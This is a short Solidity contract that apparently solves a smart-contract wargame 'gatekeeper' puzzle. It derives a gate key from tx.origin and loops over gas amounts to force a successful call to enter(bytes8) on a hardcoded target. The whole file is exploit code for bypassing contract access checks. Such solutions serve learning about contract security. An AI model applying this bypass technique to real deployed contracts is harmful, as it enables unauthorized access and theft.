// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Solver {
    address target = 0x6Ab46872d1C730A48dcE0Ce2C0A3c8ba8bA1A946;
    bytes8 public gateKey = 0xFFEEDDCC00000000;

    constructor() {
        gateKey = bytes8(uint64(gateKey) | uint16(uint160(tx.origin)));
    }

    function solve() public {
        bytes memory data = abi.encodeWithSignature("enter(bytes8)", gateKey);
        for (uint256 i = 0; i < 8191; i++)
        {
            (bool success, ) = target.call{ gas: 8191 * 10 + i }(data);
            if (success)
                break;
        }
    }
}
